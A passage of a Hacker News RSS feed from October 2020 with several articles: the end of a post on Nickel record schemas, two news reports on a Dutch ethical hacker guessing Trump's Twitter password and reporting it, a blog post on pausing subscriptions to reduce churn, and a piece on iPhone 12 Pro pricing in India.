<p>An example of contract is given in the next section.</p>
<h2>Schemas</h2>
<p>While the basic computational blocks are functions, the basic data blocks in
Nickel are records (or objects in JSON). Nickel supports writing self-documenting
record schemas, such as:</p>
<div data-language="text"><pre><code>{
  host | type: Str
       | description: "The host name of the server."
       | default: "fallback.myserver.net"
  ;

  port | type: Num
       | description: "The port of the connection."
       | default: 4242
  ;

  url | type: Url
      | description: "The host name of the server."
  ;
}</code></pre></div>
<p>Each field can contain metadata, such as a description or default
value. These aim at being displayed in documentation, or queried by
tools.</p>
<p>The schema can then be used as a contract. Imagine that a function has
swapped two values in its output and returns:</p>
<div data-language="text"><pre><code>{
  host = "myproject.com",
  port = "myproto://myproject.com:1/",
  url = 1
}</code></pre></div>
<p>Without types, this is hard to catch. Surely, an error will eventually pop up
downstream in the pipeline, but how and when? Using the schema above
will make sure that, whenever the fields are actually evaluated, the
function will be blamed in the type error.</p>
<p>Schemas are actually part of a bigger story involving merging records
together, which, in particular, lets the schema instantiate missing
fields with their default values. It is very much inspired by the
<a href="https://nixos.org/manual/nixos/stable/index.html#sec-configuration-syntax">NixOs module system</a> and the <a href="https://cuelang.org/">CUE</a> language, but
it is a story for another time.</p>
<h2>Conclusion</h2>
<p>I hope that I gave you a sense of what Nickel is trying to achieve. I
only presented its most salient aspects: its gradual type system with
contracts, and built-in record schemas. But there is more to explore!
The language is not ready to be used in real world applications yet, but a good
share of the design presented here is implemented. If you are curious about it,
<a href="https://www.github.com/tweag/nickel">check it out</a>!</p></div></div></div></div>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24858456</guid>
            <pubDate>Thu, 22 Oct 2020 14:35:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dutch Ethical Hacker Logs into Trump’s Twitter Account]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24858219">thread link</a>) | @huijzer
<br/>
October 22, 2020 | https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/ | <a href="https://web.archive.org/web/*/https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-artstyle-marker="paywall"><section data-artstyle-marker="paywall"><figure data-element-id="71cde2cd-2335-4b84-b278-26460a834b90"><picture><source srcset="https://images2.persgroep.net/rcs/3L2D94DUUcqGUKV6M79IbLq4gq0/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9&amp;desiredformat=webp" type="image/webp"><source srcset="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" type="image/jpeg"><img data-credit="Beeld Getty Images" data-height="885" data-original="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" data-title="U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020." data-width="1240" src="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9"> </picture><figcaption><cite>U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020.</cite><span>Beeld Getty Images</span></figcaption></figure><p data-element-id="4aeb-3d95-850b-1e5e-3b11-54f3-9f2c-5a33">The researcher, Victor Gevers, had access to Trump’s personal messages, could post tweets in his name and change his profile. Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>
            </description>
            <link>https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24858219</guid>
            <pubDate>Thu, 22 Oct 2020 14:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dutch researcher accesses Trump's Twitter account using password “maga2020!”]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24858059">thread link</a>) | @tomwas54
<br/>
October 22, 2020 | https://www.rtlnieuws.nl/nieuws/buitenland/artikel/5191916/donald-trump-twitter-gehackt-nederlandse-hacker-victor-gevers | <a href="https://web.archive.org/web/*/https://www.rtlnieuws.nl/nieuws/buitenland/artikel/5191916/donald-trump-twitter-gehackt-nederlandse-hacker-victor-gevers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
            <p><span>Geen extra beveiliging</span></p>
            <p><span>22 oktober 2020 15:49</span>
                                    <span>Aangepast: 23 oktober 2020 20:46</span>
                            </p>
        </div>
        <div>
                            
                                      <p><img src="https://www.rtlnieuws.nl/sites/default/files/styles/liggend/public/content/images/2020/10/22/naast_20201022144340.jpg?itok=0dJiJLkQ" alt="" typeof="foaf:Image">



    <span>
        Donald Trump (links) en ethisch hacker Victor Gevers (rechts).
    </span>
            <span>
            Beeld © Getty / Twitter
        </span>
    


        </p></div>
    </div><div>
        <div id="sticky-parent">
            
            <p>    Het Twitteraccount @realDonaldTrump van de Amerikaanse president Donald Trump is gehackt door een Nederlander. Trump gebruikte het wachtwoord 'maga2020!' (make america great again) en zou geen extra beveiliging hebben ingesteld.
</p>

            <section>
                    

        <div>
                    <div>
                    <p>De Nederlander is ethischÂ&nbsp;hacker <a href="https://twitter.com/0xDUDE">Victor Gevers</a>, die al vele duizendenÂ&nbsp;datalekken en andere kwetsbaarheden op het internet heeft gemeld. Het kostte hem zeven pogingen om het wachtwoord van de Amerikaanse president te raden, zo stelt hij tegenÂ&nbsp;<a href="https://www.vn.nl/twitter-trump-opnieuw-gehackt/">Vrij Nederland</a>.</p>
<p>"Ik dacht 'oh god' toen ik was ingelogd", vertelt GeversÂ&nbsp;tegen RTL Nieuws. "Ik wil juist dat het me niet lukt om binnen te komen, en al helemaal niet bij zo'n belangrijk account."</p>

            </div>
            </div>

            <div>
    <div>
        <p><img src="https://www.rtlnieuws.nl/sites/default/files/styles/liggend/public/content/images/2020/10/22/trumptwitter.png?h=a3d03003&amp;itok=mbT9FTAn" alt="Een screenshot gemaakt door Gevers toen hij op 16 oktober was ingelogd.">
                    <span>
                Een screenshot gemaakt door Gevers toen hij op 16 oktober was ingelogd.
            </span></p><p><span>Â© Vrij Nederland </span>
            </p>
            </div>
</div>

        <div>
                    <div>
                    <h2>Account gehackt</h2>
<p>Het bewijs dat Gevers toegang had tot het Twitter-account van Trump is ingezien door RTL Nieuws en Vrij Nederland. Trump had volgens Gevers ook geen extra beveiliging ingesteld, zoals de code die je soms na het inloggen moet invoeren - ook wel <a href="https://help.twitter.com/nl/managing-your-account/two-factor-authentication">tweestapsverificatie</a> genoemd.</p>
<p>Gevers heeft niet namens Trump getweet of zijn privÃ©berichten ingezien, maar had beide wel kunnen doen. Als ethisch hacker waarschuwt hij personen of organisaties op kwetsbaarheden in de hoop die te verhelpen. Gevers is binnen de Nederlandse hackerwereld bekend en geliefd om zijn ethische werkwijze.</p>

            </div>
            </div>

            <div>
    <p><img src="https://www.rtlnieuws.nl/sites/default/files/styles/liggend/public/content/images/2020/10/22/victor-gevers-gdi.jpg?itok=JeiLhHHV" alt="Gevers is voorzitter van de DIVD, een instelling die kwetsbaarheden opspoort en meldt.">
                    <span>
                Gevers is voorzitter van de DIVD, een instelling die kwetsbaarheden opspoort en meldt.
            </span>
                    </p>
</div>

        <div>
                    <div>
                    <h2>'Immense gevolgen'</h2>
<p>Correspondent Erik Mouthaan zegt dat Trumps Twitteraccount zijn belangrijkste communicatiemiddel is. "Het Witte Huis heeft gezegd dat alle tweets gelden als officiÃ«le verklaringen van de president. Op ministeries wordt hetÂ&nbsp;account scherp in de gaten gehouden, want vaak moet er beleid gemaakt worden op basis van Trumps gedachten. Zo kondigde hij via Twitter een verbod op transgenders in het leger aan, in plaats van een persbericht of een wetsvoorstel."</p>
<p>"Twitter is de plek waar Trump zijn woede en trots ventileert, je krijgt echt mee hoe hij zich van moment tot moment voelt. Als een kwaadwillende partij vlak voor de verkiezingen het account zou kapen, kan dat immense gevolgen hebben voor de integriteit van de verkiezingenÂ&nbsp;en de veiligheid van het land."</p>

            </div>
            </div>

        <div>
                    <div>
                    <h2>Secret Service</h2>
<p>Mogelijk had Trump geen tweestapsverificatie omdat zijn campagneteam ook toegang moet hebbenÂ&nbsp;tot zijn Twitteraccount. Zo'n extra beveiliging maakt het lastiger om een account te delen met anderen. Gevers heeft via-via contact gekregen met deÂ&nbsp;United States Secret Service en het lek gemeld.</p>
<p>Het is niet de eerste keer dat Gevers toegang had tot het Twitteraccount van Trump. In 2016 lukte het hem om samen met twee vrienden toegang te krijgen. Toen was het wachtwoord 'yourefired', dat Gevers samen met zijn twee hackervrienden vond tussen de gelekte LinkedIn-wachtwoorden.Â&nbsp;</p>
<p>Twitter is om een reactie gevraagd, maar heeft niet gereageerd.</p>

            </div>
            </div>

    <a href="https://www.rtlnieuws.nl/tech/artikel/5182681/nederlanders-hackten-twitter-account-donald-trump-2016">
    <div>
        <figure>
            <img src="https://www.rtlnieuws.nl/sites/default/files/styles/artikel_top/public/content/images/2020/08/28/trump.jpg?h=a9edb586&amp;itok=eBhiQra0" alt="Miniatuurvoorbeeld" typeof="foaf:Image">
        </figure>
        <div>
            <p><span>    Lees ook:
</span></p><h4>'Nederlanders hackten Twitter-account Donald Trump in 2016'</h4>
        </div>
    </div>
</a>

        <div>
                    <div>
                    <h2>Advies</h2>
<p>Trump heeft inmiddels zijn wachtwoord aangepast en tweestapsverificatie ingeschakeld. Dat juicht Gevers toe: "Alsjeblieft mensen, schakel tweestapsverificatie in", zegt hij. "Zelfs als je een slecht wachtwoord gebruikt, zoals 'maga2020!', dan nog blijf je beschermd tegen dit soort simpele aanvallen."</p>

            </div>
            </div>

        <div>
                    <div>
                <article id="node-">
                                            <h2>Met deze dubbele beveiliging zijn je online accounts pas echt veilig</h2>
                    

                    


                                            <span>Zelfs met een sterk wachtwoord ben je online niet altijd veilig. Wil jij zeker weten dat alleen jij bij jouw account kan? Met tweestapverificatie maak je het hackers een stuk moeilijker. Techjournalist DaniÃ«l Verlaan legt uit hoe het werkt.</span>
                                    </article>
            </div>
            </div>


            </section>
            
        </div>
    </div><section>
            



                <div>

<div>
<p><b>Altijd weten wat er speelt?</b><br><em>Download de gratis RTL Nieuws-app en blijf op de hoogte.</em><br></p>

<p>

<a href="https://play.google.com/store/apps/details?id=nl.rtl.rtlnieuws&amp;hl=nl" target="_blank">
<img alt="Playstore" src="https://www.rtlnieuws.nl/sites/default/files/inline-images/Playstore.png">
</a>

<a href="https://itunes.apple.com/nl/app/rtl-nieuws-mobile/id586030236?mt=8" target="_blank"> 
<img alt="Appstore" src="https://www.rtlnieuws.nl/sites/default/files/inline-images/Appstore.png">
</a> 

</p>

</div></div>

    
    



                

    
    
        </section></div>]]>
            </description>
            <link>https://www.rtlnieuws.nl/nieuws/buitenland/artikel/5191916/donald-trump-twitter-gehackt-nederlandse-hacker-victor-gevers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24858059</guid>
            <pubDate>Thu, 22 Oct 2020 13:57:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Prevent Customer Cancellations]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24857713">thread link</a>) | @pmuens
<br/>
October 22, 2020 | https://philippmuens.com/how-to-prevent-customer-cancellations/ | <a href="https://web.archive.org/web/*/https://philippmuens.com/how-to-prevent-customer-cancellations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Customer retention is a goal every business owner should be obsessed with. At the end of the day it's cheaper to retain an existing customer than it is to acquire a new one.</p><p>But how do you ensure that your customers keep using your service?</p><p>Are there any simple, yet effective ways to reduce or even prevent churn?</p><p>As it turns out there's one simple strategy you can use to keep your customers around even if they're about to leave your platform. Let's explore what it is and why it works.</p><h2 id="why-you-should-obsess-over-customer-retention">Why you should obsess over customer retention</h2><p>As already stated in the introduction it's important to focus on customer retention when building a sustainable business.</p><p>Acquiring customers can be an expensive endeavour. If you're not (yet) in a position where your product grows through Word-of-Mouth you're likely spending a good portion of your revenue on paid ads and marketing to drive traffic to your service. Only a few of your thousands of visitors will eventually try your product and convert to become a paying customer.</p><p>Optimizing this marketing and sales funnel is a tricky and costly activity. Think about it for a minute. Who finances your learnings and tweakings of such funnel? Correct, <strong>your existing customers</strong>.</p><p>That's why keeping your users happy and around is one of the most important business objectives.</p><h2 id="why-customers-are-churning">Why customers are churning</h2><p>If you think about it, there's really only one reason why your customers are leaving your platform:</p><blockquote>Your product isn't a crucial part of their life anymore</blockquote><p>While this sounds harsh I'd like you to think about all the services you're currently subscribing to. Now imagine that you can only keep one. What would you cancel? Probably everything except the one you can't live without.</p><p>Of course, the preferences are different from person to person and they change over time. And that's the exact reason why people cancel their subscription with your service: Their preferences have changed and they might want to take a pause from your service or need something else entirely.</p><h2 id="churn-baby-churn">"Churn Baby Churn"</h2><p>Now that we know why your customers churn, it's time to get into their shoes and think about ways to keep them around.</p><p>One of the "industry" standards is to send out a survey once they're about to leave to gather feedback and convince them to stay. Some services offer coupon codes if for example the user has clicked on the "it's too expensive" option in the survey.</p><p>Other tactics are more on the "dark patterns" side of things. Hiding buttons, asking double negative questions or using other techniques to make it nearly impossible to leave. Needless to say that customers of businesses practicing such tactics aren't the ones who spread the word on how awesome the product is. Quite the opposite.</p><p>But let's take a step back for a minute and ask ourselves why this "should I stay or should I go" question has to be binary in the first place. Isn't there something "right in the middle"? Something where a user can stay but somehow go at the same time?</p><h2 id="wait-a-minute-or-a-month-">"Wait a minute... or a month..."</h2><p>The solution to this dilemma is dead simple and obvious, yet rarely used: Make it possible to <strong>pause the subscription</strong>.</p><p>Yes, it's that simple. Just offer a way to pause a subscription and get back to it once your users current circumstances have changed.</p><p>Now you might think that it's a really bad idea to let users pause their subscription. They'll pause and never come back. So essentially it's a "passive churn" as they haven't left the platform yet but might never use it again. The stale user data is sitting in the database and your dashboards are still showing hockey-stick growth. Furthermore it's a huge implementation effort as pausing and resuming subscriptions isn't something considered business critical and hence wasn't implemented just yet.</p><p>Those are all valid concerns and some of them might turn out to be true even if you have a "pause- and resume your subscription" system in place. But let's take a seconds to look at the other side of the equation.</p><h2 id="why-pausing-is-a-good-idea">Why pausing is a good idea</h2><p>They very first thing that comes to mind is the COVID-19 pandemic we're currently in. A lot of business scaled back and hence had to cancel subscriptions to their favorite SaaS tools to cut costs. A common "save the customer tactic" used here was to get in touch with the business owner and offer heavy discounted year long subscription plans. That way businesses could reassess if they should really quit and leave the huge discount on the table or just go with it and double down to benefit from the sweet, discounted multi-year subscription deal.</p><p>Letting business put their subscription on hold would be another strategy that could be used to help retain and eventually reactivate your users during this pandemic. Put yourself into your customers shoes again for a minute. Wouldn't you want to pay it back in the future if your supplier lent you a helping hand and wasn't "forcing" you out the door?</p><p>Even if your customers pause their account you still have their E-Mail address to reach out to them and keep them informed about your product. In fact you should use this opportunity to stay in touch, ask them how they're doing and providing something of value along the way. That way you keep the communication "warm" and your business stays on "their radar". There's a higher likelihood that they think about your service when times have changed and they're about to scale things up again.</p><p>Having a way to pause a subscription is an action that's usually taken with some level of consideration. If your customer wants to quit (s)he'll just cancel the subscription anyway. Offering a way to pause for the time-being is another option your users might just not have right now, so they're forced to make a very binary decision and therefore they just quit.</p><p>What you should also think about is that pausing a subscription doesn't necessarily mean that you'll lose revenue for sure. There are different and very creative ways in which you can implement the pause. My gym for example simply extends my membership for the amount of months I put my membership on hold. In the summer I make use of this feature since I do my workouts outside anyways. However those 3-4 months I "save" are simply "added" to my contract. I just have a little bit more control about how and where I spend my time with sports. You can get really creative here and invent other ways for this mechanism to work if you really want to ensure that you don't lose revenue.</p><p>A last, important point is that you can use this functionality as a competitive advantage and "marketing material". Be sure to add the fact that people can pause their subscription to your list of product benefits. Add it to the copy right next to your "Subscribe Now" button. Addressing objections and concerns right before the call-to-action is about to happen will drastically increase your conversion rates.</p><h2 id="things-to-keep-in-mind-when-going-down-that-path">Things to keep in mind when going down that path</h2><p>Now you might be excited and eager to implement this strategy in the near future but before you do so I'd like to call out a couple of things you should keep in mind when implementing it.</p><p>First of all: <strong>Keep it simple</strong>. There's no need to jump right into code and implement this functionality end-to-end. Do it manually in the beginning. Update the database records and the subscription plans for people who want to pause their subscription by hand. Maybe you find out that very few people want to make use of this feature. What you definitely want to put in place is your new copywriting. As discussed above you should ensure that your marketing website is updated and reflects the recent change you just introduced.</p><p>Next up you want to have an <strong>automated follow-up E-Mail sequence</strong> / Drip campaign setup for pausing customers. Keep in touch. Ask for problems they had with your software and help them succeed in whatever they're up to right now. You might want to jump on a quick call to gather some feedback as to why they paused and understand what needs to be in place for them to come back. If you do this, please ensure that you're <strong>genuinely interested</strong> in the communication. There's nothing worse for a user than composing a reply and shooting the E-Mail into the marketing void.</p><p>A very important, yet often overlooked step is to have a tool in place which deals with "passive churn". Such a system ensures that the credit cards on file are up to date and chargeable. There could be an overlap between your users pausing their subscription and their credit cards expiring. You don't want to make them look bad because of that. You could even think about a "concierge service" which onboards them in person once they'll come back. Combine this with a quick update on all the new features / updates they missed and are not yet familiar with.</p><p>Lastly you absolutely don't want to make it hard for your users to pause their subscription. As mentioned above, avoid dark patterns at all costs. And more importantly: <strong>Don't penalize them for pausing</strong>. Messages such as "We'll retain your data for the next 60 days" are inappropriate in the day and age of "Big Data" and access to Petabytes of storage for a nickel and dime.</p><h2 id="your-challenge">Your challenge</h2><p>I'd like to challenge you to think about adding the possibility to pause a subscription. Is it suitable for your business? Would it help you retain and reactive more customers (especially in the current situation we're in)?</p><p>If you're about to add it, keep in mind that it doesn't have to be complicated. Start with a simple E-Mail form your users can fill out to let you know for how long they want to pause. Just make sure that you follow the best practices outlined above and that you advertise that it's now possible for your customers to pause their subscriptions.</p><h2 id="conclusion">Conclusion</h2><p>Customer retention is one of the most important metrics every business owner should focus on. It's the existing customers who finance the Customer Acquisition Costs that are necessary to bring new users into the door.</p><p>It's almost always cheaper to keep your existing …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://philippmuens.com/how-to-prevent-customer-cancellations/">https://philippmuens.com/how-to-prevent-customer-cancellations/</a></em></p>]]>
            </description>
            <link>https://philippmuens.com/how-to-prevent-customer-cancellations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857713</guid>
            <pubDate>Thu, 22 Oct 2020 13:22:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[iPhone 12 Pro so costly in India, you can fly to Dubai to buy it and save money]]>
            </title>
            <description>
<![CDATA[
Score 230 | Comments 240 (<a href="https://news.ycombinator.com/item?id=24857646">thread link</a>) | @notRobot
<br/>
October 22, 2020 | https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21 | <a href="https://web.archive.org/web/*/https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Apple launched four new iPhones including the iPhone 12 Mini, iPhone 12, iPhone 12 Pro, and iPhone 12 Pro Max. Out of all the four new releases, only two will be available in India for now- the iPhone 12 and iPhone 12 Pro. Soon after the new iPhones were announced, Apple discontinued the iPhone 11 Pro and iPhone Pro Max. The company also reduced the prices of its existing iPhones including the iPhone 11, iPhone XR, and iPhone SE.</p><p>The Apple iPhone 12 is priced starts at Rs 69,900 for the base variant whereas the iPhone 12 Pro costs Rs 1,19,900 for the base variant. Well, that is not something unexpected. Considering the previous trends, the iPhone Pro models are released with an exorbitant price tag. Now to add to the woes of people looking to buy the iPhone 12 Pro, they should know that the Apple iPhone 12 Pro is more expensive in India than in any other country. Dubai for instance sells the iPhone 12 Pro for Rs 84,000.</p><p>Now this rings a bell. The iPhone 12 Pro is comparatively cheaper in Dubai. So cheap that you can actually go to Dubai, buy the phone and come back. Let us explain the math to you for a better understanding.</p><p><strong>iPhone 12 Pro Price in India for 128 GB:</strong> Rs 1,19,000</p><p><strong>iPhone 12 Pro Price in Dubai for 128GB: </strong>Rs 84,000. It costs Dh 4,199 in Dubai and if you convert the currency to INR, the price comes down to almost Rs 84,000.</p><p>So, should this mean that you can go to Dubai, buy the phone and then come back? Well, if you ask me. It is not that bad an idea. The 12 Pro will go on sale from November 6. So you book a flight for Dubai from Delhi or Kolkata for November 6 or later than that, you can get the return ticket for a little over Rs 18,000.</p><p>Below is the exact amount, you would be spending on your flight tickets to Dubai from New Delhi. However, the amount might change depending on the availability but this is what we found when tried booking a ticket to Dubai.</p><p><em>Flight ticket: Indigo Rs 17929 approx<br>iPhone 12 Pro 128GB: 84,000<br>Some other expenses: Around Rs 10,000<br>Total: Around Rs 1,11,929<br>Money saved: Around Rs 8000</em></p><div> <p><img data-src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" alt=""></p></div><p>Now, considering that the world is battling coronavirus pandemic and the virus is in no mood to slow down, we do not encourage anyone to travel. The whole idea was to not send you to Dubai but to draw your attention towards Apple’s exorbitant pricing in India. It is no secret that the taxes and duties that are applied to imported phones are highest in India. The taxes are so high that for an important iPhone that you will end up paying an average tax of Rs 24,000 for something like an iPhone 12 or iPhone 12 Mini.</p><p>However, despite the sky-rocketing prices, iPhone still sells best in India and the buyers give whatever price Apple asks them to pay. So for a business, that is not a bad deal at all.</p><p><span>ALSO READ | </span><a href="https://www.indiatoday.in/technology/features/story/apple-iphone-12-pro-12-pro-max-launched-price-specifications-and-features-1731303-2020-10-13">Apple iPhone 12 Pro, 12 Pro Max launched: Price, specifications, and features</a></p><p><iframe allowfullscreen="" frameborder="0" height="360" src="//www.youtube.com/embed/-6m1wJTd6hs" width="640"></iframe></p></div></div>]]>
            </description>
            <link>https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857646</guid>
            <pubDate>Thu, 22 Oct 2020 13:15:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building replacement proprietary battery packs]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 118 (<a href="https://news.ycombinator.com/item?id=24857527">thread link</a>) | @todsacerdoti
<br/>
October 22, 2020 | https://www.hallaminventions.com/projects/minidisc-obsession | <a href="https://web.archive.org/web/*/https://www.hallaminventions.com/projects/minidisc-obsession">archive.org</a>
